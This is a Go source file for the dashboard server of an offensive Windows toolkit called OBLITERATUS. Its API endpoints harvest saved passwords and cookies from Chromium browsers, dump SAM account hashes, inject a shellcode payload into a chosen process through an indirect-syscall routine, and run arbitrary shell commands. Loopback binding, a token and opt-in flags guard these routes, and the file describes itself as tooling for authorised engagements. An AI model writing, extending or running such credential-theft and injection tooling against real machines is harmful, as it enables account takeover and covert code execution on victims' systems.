// Package server implements the local OBLITERATUS dashboard API.
//
// Security model (v2 rewrite — the v1 model had critical holes):
//
//   - Listener binds 127.0.0.1 only (v1 bound :8080 on every interface).
//   - Per-run 256-bit crypto/rand token (v1 derived it from the PID, and the
//     PID is visible to any local process; worse, the token was echoed to any
//     unauthenticated GET of "/").
//   - Every API route requires loopback Host + the token in a custom header,
//     which also defeats CSRF (cross-origin fetches with custom headers are
//     preflighted, and we never approve a preflight).
//   - State-changing routes are POST-only (ServeMux method patterns).
//   - WebSocket requires a loopback Origin AND the token (?t=).
//   - Offensive modules (credential collection, injection) answer 403 unless
//     the operator started with --enable-collect / --enable-inject.
package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/DevCop95/obliteratus/internal/audit"
	"github.com/DevCop95/obliteratus/internal/elevate"
	"github.com/DevCop95/obliteratus/internal/research"
	"github.com/DevCop95/obliteratus/internal/ui"
	"github.com/DevCop95/obliteratus/internal/winutil"
)

// DefaultAddr is the loopback-only listen address.
const DefaultAddr = "127.0.0.1:8080"

// Config wires a Server.
type Config struct {
	// Token is the per-run API token (see token.New).
	Token string
	// Version is reported by /v1/sys/st and audit reports.
	Version string
	// Addr is the listen address; defaults to DefaultAddr. Loopback only is
	// enforced at Listen time.
	Addr string
	// EnableCollect unlocks the credential/cookie collectors.
	EnableCollect bool
	// EnableUnlock inject unlocks the indirect-syscall injection module.
	EnableInject bool
	// PayloadPath is the shellcode file used by the injection module.
	PayloadPath string
	// Elevated reflects the current token state (for status + audit reports).
	Elevated bool
}

// Server is the dashboard API.
type Server struct {
	cfg        Config
	token      string
	version    string
	addr       string
	connectSrc string
	hub        *hub
	mux        *http.ServeMux
}

// New builds a Server with all routes registered.
func New(cfg Config) *Server {
	if cfg.Addr == "" {
		cfg.Addr = DefaultAddr
	}
	if cfg.Token == "" {
		panic("server: Config.Token is required (generate with token.New())")
	}
	if cfg.PayloadPath == "" {
		cfg.PayloadPath = filepath.Join("payloads", "research_signal.bin")
	}
	s := &Server{
		cfg:     cfg,
		token:   cfg.Token,
		version: cfg.Version,
		addr:    cfg.Addr,
		// connect-src must name the exact ws:// endpoints the page may reach.
		connectSrc: wsOrigins(cfg.Addr),
		hub:        newHub(),
		mux:        http.NewServeMux(),
	}
	s.routes()
	return s
}

// wsOrigins renders the ws:// CSP entries for every loopback name, on the
// port this server actually listens on.
func wsOrigins(addr string) string {
	p := portOf(addr, "8080")
	return "ws://127.0.0.1:" + p + " ws://localhost:" + p + " ws://[::1]:" + p
}

func portOf(addr, fallback string) string {
	if _, p, err := net.SplitHostPort(addr); err == nil && p != "" {
		return p
	}
	return fallback
}

// routes registers every endpoint. Method patterns ("POST /path") make the
// ServeMux answer 405 automatically for wrong verbs — no handler ever has to
// remember to check.
func (s *Server) routes() {
	// --- pages (host-checked; token travels inside the page) ---------------
	s.mux.HandleFunc("GET /{$}", s.guardPage(s.handleIndex))
	s.mux.HandleFunc("GET /healthz", s.guardPage(s.handleHealth))
	s.mux.HandleFunc("GET /ws", s.handleWS)

	// --- read-only system API ------------------------------------------------
	s.mux.HandleFunc("GET /v1/sys/st", s.guard(s.handleStatus))
	s.mux.HandleFunc("GET /v1/sys/hex", s.guard(s.handleHex))
	s.mux.HandleFunc("GET /v1/sys/b2", s.guard(s.handleProcesses))

	// --- state-changing system API ------------------------------------------
	s.mux.HandleFunc("POST /v1/sys/cmd", s.guard(s.handleCommand))
	s.mux.HandleFunc("POST /v1/sys/opt", s.guard(s.handleTweaks))

	// --- authorised collection module (--enable-collect) ---------------------
	s.mux.HandleFunc("GET /v1/sys/a7", s.guard(s.handlePasswords))
	s.mux.HandleFunc("GET /v1/sys/cookies", s.guard(s.handleCookies))
	s.mux.HandleFunc("GET /v1/sys/nexus", s.guard(s.handleNexus))
	s.mux.HandleFunc("POST /v1/op/a7", s.guard(s.handlePasswordsStream))
	s.mux.HandleFunc("POST /v1/op/cookies", s.guard(s.handleCookiesStream))
	s.mux.HandleFunc("POST /v1/sys/sam", s.guard(s.handleSAMStream))

	// --- authorised injection module (--enable-inject) -----------------------
	s.mux.HandleFunc("POST /v1/op/d4", s.guard(s.handleInject))

	// --- defensive audit (always available) ----------------------------------
	s.mux.HandleFunc("POST /v1/audit/report", s.guard(s.handleAuditReport))
	s.mux.HandleFunc("POST /v1/audit/csv", s.guard(s.handleAuditCSV))
}

// Handler returns the full middleware-wrapped handler.
func (s *Server) Handler() http.Handler { return s.mux }

// ListenAndServe starts the loopback listener. It refuses to bind anything
// that is not a loopback address: a dashboard with a console endpoint must
// never be reachable from the network.
func (s *Server) ListenAndServe() error {
	if !isLoopbackAddr(s.addr) {
		return fmt.Errorf("server: refusing to bind non-loopback address %q (console + collectors are local-only by design)", s.addr)
	}
	ln, err := net.Listen("tcp", s.addr)
	if err != nil {
		return err
	}
	log.Printf("[+] dashboard: http://%s/ (loopback only, token %s…)", s.addr, short(s.token))
	srv := &http.Server{
		Handler:           s.mux,
		ReadHeaderTimeout: 10 * time.Second,
		// Idle/Write timeouts are deliberately generous: WebSocket streams and
		// large audit responses would be cut off by a short WriteTimeout.
	}
	return srv.Serve(ln)
}

// isLoopbackAddr reports whether addr starts with a loopback IP or name.
func isLoopbackAddr(addr string) bool {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		host = addr
	}
	host = strings.Trim(host, "[]")
	if loopbackHosts[host] {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback()
	}
	return false
}

func short(tok string) string {
	if len(tok) > 8 {
		return tok[:8]
	}
	return tok
}

// ---------------------------------------------------------------------------
// handlers — pages
// ---------------------------------------------------------------------------

func (s *Server) handleIndex(w http.ResponseWriter, r *http.Request) {
	// The dashboard HTML with this run's token injected (same-origin only —
	// see ui.Render for the threat-model note).
	_, _ = w.Write([]byte(ui.Render(s.token)))
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("ok"))
}

// ---------------------------------------------------------------------------
// handlers — system
// ---------------------------------------------------------------------------

func (s *Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	status := "USER"
	if elevate.IsAdmin() {
		status = "ADMIN"
	}
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte(status))
}

func (s *Server) handleHex(w http.ResponseWriter, r *http.Request) {
	// First bytes of the payload file, hex-encoded, for the hex viewer.
	b, err := os.ReadFile(s.cfg.PayloadPath)
	if err != nil || len(b) == 0 {
		w.Header().Set("Content-Type", "text/plain")
		_, _ = w.Write([]byte(""))
		return
	}
	if len(b) > 256 {
		b = b[:256]
	}
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte(fmt.Sprintf("%02x", b)))
}

func (s *Server) handleProcesses(w http.ResponseWriter, r *http.Request) {
	sendJSON(w, http.StatusOK, winutil.Processes())
}

// handleCommand is the operator console. Arbitrary command execution is the
// point of the module — which is exactly why it sits behind loopback Host +
// per-run token + POST-only + custom header (see package docs).
func (s *Server) handleCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		C string `json:"c"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || strings.TrimSpace(req.C) == "" {
		http.Error(w, "bad request: {\"c\":\"command\"}", http.StatusBadRequest)
		return
	}
	s.logLine("RUN: "+req.C, "INFO")
	out, err := runShell(req.C)
	if err != nil && len(out) == 0 {
		http.Error(w, "execution failed: "+err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	_, _ = w.Write(out)
}

func (s *Server) handleTweaks(w http.ResponseWriter, r *http.Request) {
	sendJSON(w, http.StatusOK, winutil.ApplyTelemetryTweaks())
}

// ---------------------------------------------------------------------------
// handlers — authorised collection module
// ---------------------------------------------------------------------------

// requireModule fails closed with an actionable JSON error when a gated
// module is disabled.
func (s *Server) requireModule(w http.ResponseWriter, enabled bool, name, flag string) bool {
	if enabled {
		return true
	}
	sendJSON(w, http.StatusForbidden, map[string]string{
		"error": name + " module disabled",
		"hint":  "restart obliteratus with " + flag + " if this is part of an authorised engagement",
	})
	return false
}

func (s *Server) handlePasswords(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "credential collection", "--enable-collect") {
		return
	}
	entries := audit.CollectCredentials(audit.SupportedChromiumBrowsers, s.logEmitter())
	sendJSON(w, http.StatusOK, entries)
}

func (s *Server) handleCookies(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "cookie collection", "--enable-collect") {
		return
	}
	cookies := audit.CollectCookies(audit.SupportedChromiumBrowsers, s.logEmitter())
	sendJSON(w, http.StatusOK, cookies)
}

func (s *Server) handleNexus(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "identity nexus", "--enable-collect") {
		return
	}
	sendJSON(w, http.StatusOK, audit.Nexus(s.logEmitter()))
}

// handlePasswordsStream streams credentials per browser over the WebSocket,
// preserving the v1 chunk protocol the dashboard already understands
// (a7_chunk → a7_done).
func (s *Server) handlePasswordsStream(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "credential collection", "--enable-collect") {
		return
	}
	go func() {
		for _, browser := range audit.SupportedChromiumBrowsers {
			entries := audit.CollectCredentials([]string{browser}, s.logEmitter())
			if len(entries) > 0 {
				s.hub.broadcastJSON(map[string]interface{}{
					"type":    "a7_chunk",
					"browser": browser,
					"entries": entries,
				})
			}
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "a7_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

func (s *Server) handleCookiesStream(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "cookie collection", "--enable-collect") {
		return
	}
	go func() {
		for _, browser := range audit.SupportedChromiumBrowsers {
			cookies := audit.CollectCookies([]string{browser}, s.logEmitter())
			if len(cookies) > 0 {
				s.hub.broadcastJSON(map[string]interface{}{
					"type":    "cookies_chunk",
					"browser": browser,
					"entries": cookies,
				})
			}
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "cookies_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// handleSAMStream runs the lsadump::sam module and streams the recovered
// accounts over the WebSocket (sam_chunk → sam_done), mirroring the browser
// collector protocol. Gated behind --enable-collect; the hive export itself
// (`reg save`) additionally requires an elevated token, so a non-admin run
// fails closed with an actionable hint instead of a generic 500.
func (s *Server) handleSAMStream(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "SAM hash dump", "--enable-collect") {
		return
	}
	if !elevate.IsAdmin() {
		sendJSON(w, http.StatusForbidden, map[string]string{
			"error": "SAM dump requires an elevated token",
			"hint":  "restart obliteratus with --elevate (reg save needs backup privileges)",
		})
		return
	}
	go func() {
		accounts, err := audit.DumpSAM(s.logEmitter())
		if err != nil {
			s.logLine("SAM_FAIL: "+err.Error(), "ERROR")
		}
		if len(accounts) > 0 {
			s.hub.broadcastJSON(map[string]interface{}{
				"type":    "sam_chunk",
				"entries": accounts,
			})
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "sam_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// logEmitter adapts the audit progress callbacks to the console broadcast.
func (s *Server) logEmitter() audit.Emitter {
	return func(msg, level string) {
		s.logLine(msg, level)
	}
}

// ---------------------------------------------------------------------------
// handlers — authorised injection module
// ---------------------------------------------------------------------------

// handleInject runs the Halo's Gate W^X injection routine against an
// operator-selected PID on this machine. Gated behind --enable-inject.
func (s *Server) handleInject(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableInject, "injection research", "--enable-inject") {
		return
	}
	var req struct {
		PID int `json:"pid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.PID <= 0 {
		http.Error(w, "bad request: {\"pid\":1234}", http.StatusBadRequest)
		return
	}
	payload, err := os.ReadFile(s.cfg.PayloadPath)
	if err != nil {
		http.Error(w, "payload not found: "+s.cfg.PayloadPath, http.StatusNotFound)
		return
	}
	if err := research.Inject(req.PID, payload); err != nil {
		s.logLine("INJECT_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine("PULSE_SENT", "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// ---------------------------------------------------------------------------
// handlers — defensive audit
// ---------------------------------------------------------------------------

func (s *Server) handleAuditReport(w http.ResponseWriter, r *http.Request) {
	modules := map[string]bool{
		"collect": s.cfg.EnableCollect,
		"inject":  s.cfg.EnableInject,
		"console": true,
	}
	rep := audit.BuildReport(s.version, s.cfg.Elevated, modules)
	sendJSON(w, http.StatusOK, rep)
}

func (s *Server) handleAuditCSV(w http.ResponseWriter, r *http.Request) {
	modules := map[string]bool{
		"collect": s.cfg.EnableCollect,
		"inject":  s.cfg.EnableInject,
		"console": true,
	}
	rep := audit.BuildReport(s.version, s.cfg.Elevated, modules)
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="obliteratus_audit_%s.csv"`, time.Now().Format("20060102_150405")))
	_, _ = w.Write([]byte(rep.CSV()))
}
